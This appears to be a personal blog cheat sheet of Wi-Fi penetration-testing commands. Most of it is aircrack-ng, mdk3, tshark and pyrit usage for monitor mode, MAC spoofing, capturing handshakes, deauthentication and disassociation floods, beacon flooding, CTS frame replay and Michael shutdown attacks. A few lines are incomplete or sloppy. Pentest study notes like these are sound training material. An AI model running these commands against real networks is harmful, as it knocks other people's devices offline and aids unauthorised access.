---
layout: single
title: Wifi Pentest
date: 2021-08-31
classes: wide
header:
  teaser: /assets/images/security.jpg
categories:
  - Blue Team
  - infosec
tags:
  - Blue Team
  - Red Team
---

## Monitor
https://www.acrylicwifi.com/blog/modo-monitor-wifi/

Enable

```
sudo airmon-ng start wlx00c

pkill dhclient && pkill wpa_supplicant

iw config 

sudo ifconfig wlan1mon up

```

## restart network

```
/etc/init.d/networking restart
```


## MAC address spoofing

https://wiki.archlinux.org/title/MAC_address_spoofing_(Espa%C3%B1ol)

```
macchanger -l | grep -i "apple"

sudo macchanger --mac=00:20:91:ad:fa:91 wlan1mon
```

https://es.wikipedia.org/wiki/Aircrack-ng#:~:text=Aircrack%2Dng%20es%20una%20suite,airbase%2Dng

```
sudo airodump-ng wlan1mon
```
https://yisux.wordpress.com/2009/03/11/aircrack-ng-comandos-basicos-para-ataques-con-clientes-asociados/

https://www.aircrack-ng.org/~~V:/doku.php?id=es:airodump-ng#:~:text=Airodump%2Dng%20se%20usa%20para,y%20obtener%20la%20clave%20WEP.

## Specific channel

```
airodump-ng -c 1 wlan1mon
```

## Filter

```
airodump-ng -c 3 --essid AndroidAP7739 wlan1mon
--bssid
```

## Export data

```
airodump-ng -c 3 -w Captura --essid AndroidAP7739 wlan1mon
```

## Handshake

https://hacking-etico.com/2013/05/08/redes-wifi-con-wpawpa2inviolables/#:~:text=El%20handshake%20es%2C%20a%20grosso,la%20contrase%C3%B1a%20WiFi%20pero%20cifrada.

## Desautenticación 
https://www.google.com/search?q=Ataque+de+de-autenticaci%C3%B3n+aireplay&rlz=1C1GCEA_enES868ES868&oq=Ataque+de+de-autenticaci%C3%B3n+aireplay&aqs=chrome..69i57j33i160.5751j0j7&sourceid=chrome&ie=UTF-8
https://en.wikipedia.org/wiki/Wi-Fi_deauthentication_attack
Drigido 
```
aireplay-ng -0 10 -e AndroidAP7739 -c MACCLIENTE wlan1mon
```

Global
```
aireplay-ng -0 10 -e AndroidAP7739 -c FF:FF:FF:FF:FF:FF wlan1mon
aireplay-ng -0 10 -e AndroidAP7739  wlan1mon
```

##  Autenticación falsa

https://www.aircrack-ng.org/doku.php?id=es:shared_key

```
aireplay-ng -1 0 -e AndroidAP7739 -a MACCLIENT -h FALSAMAC wlan1mon
```

## CTS Frame Attack

```
tshark -r captura-01.cap -Y "wlan.fc.type_subtype==28" 2>/dev/null # CHECK CTS
tshark -r captura-01.cap -Y "wlan.fc.type_subtype==28" -Tjson 2>/dev/null # CHECK CTS
tshark -r captura-01.cap -Y "wlan.fc.type_subtype==28" -Tfields -e wlan.duration 2>/dev/null # CHECK CTS

wireshark captura-01.cap > /dev/null 2>&1 &
disown

```

Change HEX BEFORE LAST 10 ADD 30 AND THE NUMBER

```
ghex captura.cap

```

```
tcpreplay --intf1=wlan0mon --topspeed --loop=2000 prueba.cap 2>/dev/null
```

## Beacon flood mode

https://mundo-hackers.weebly.com/beacon-flood.html

```
for i in $(seq 1 10); do echo $1; done
for i in $(seq 1 10); do echo "MyNetwork$i" >> redes.txt; done

mdk3 wlan0mon b -f redes -a -s 1000 -c 3

```

## Disassociation amok mode

https://mundo-hackers.weebly.com/amok-mode---disassociation.html


```
nano blacklist # añadir station (clientes a expulsar)
mdk3 d -w blacklist -c 1
```

## Michael shutdown exploitation
https://mundo-hackers.weebly.com/michael-shutdown-exploitation.html
```
mdk3 wlan0mon m -t MAC 
```

## pyrit

https://github.com/JPaulMora/Pyrit

```
wget 

https://pypi.python.org/packages/6d/72/c055abd32bcd4ee6b36ef8e9ceccc2e242dea9b6c58fdcf2e8fd005f7650/scapy-2.3.2.tar.gz

python setup.py clean
python setup.py build
python setup.py install

python pyrit -r captura.cap analyze
```
